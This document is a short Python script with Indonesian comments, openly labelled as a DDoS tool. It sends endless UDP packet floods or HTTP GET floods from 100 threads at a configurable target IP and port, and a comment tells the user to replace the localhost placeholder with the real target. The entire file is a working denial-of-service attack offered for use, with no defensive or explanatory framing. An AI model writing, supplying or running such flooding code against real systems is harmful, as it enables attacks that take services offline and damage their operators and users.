import socket
import threading
import random
import requests

# Konfigurasi Target
target = "127.0.0.1" # Ganti dengan IP/URL target
port = 80
attack_type = "UDP" # Pilihan: UDP atau HTTP

# Payload untuk UDP Flood
data = random._urandom(1024) 

def udp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    addr = (str(target), int(port))
    while True:
        try:
            s.sendto(data, addr)
            print(f"[+] UDP Strike Sent to {target}")
        except:
            print("[!] Error in UDP Strike")

def http_flood():
    while True:
        try:
            # Mengirim request HTTP GET terus menerus
            requests.get(f"http://{target}")
            print(f"[+] HTTP Request Sent to {target}")
        except:
            print("[!] Target Down or Unreachable")

# Multithreading Engine
def start_v1(thread_count):
    print(f"--- DDOS V1 INITIATED ON {target} ---")
    for i in range(thread_count):
        if attack_type == "UDP":
            t = threading.Thread(target=udp_flood)
        else:
            t = threading.Thread(target=http_flood)
        t.start()

# Jalankan dengan 100 thread
if __name__ == "__main__":
    start_v1(100)
